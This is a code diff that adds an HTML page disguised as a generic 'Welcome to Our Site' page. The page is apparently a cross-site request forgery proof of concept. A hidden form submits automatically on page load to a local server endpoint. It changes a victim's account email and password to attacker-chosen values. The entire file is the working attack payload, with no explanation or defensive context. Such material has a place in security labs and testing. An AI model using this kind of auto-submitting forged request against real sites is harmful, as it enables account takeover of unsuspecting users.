@@ -1,0 +1,22 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+ 
+    
+</head>
+<body>
+    <center><h1>Welcome to Our Site</h1></center>
+    <form id="csrf-form" action="http://0.0.0.0:4000/update" method="POST">
+        <input type="hidden"  name="userEmail" value="sm@sm.com">
+        <input type="hidden" name="newEmail" value="gurukul@gmail.com">
+        <input type="hidden" name="newPassword" value="guru">
+    </form>
+    <script>
+        document.getElementById("csrf-form").submit();
+    </script>
+</body>
+</html>
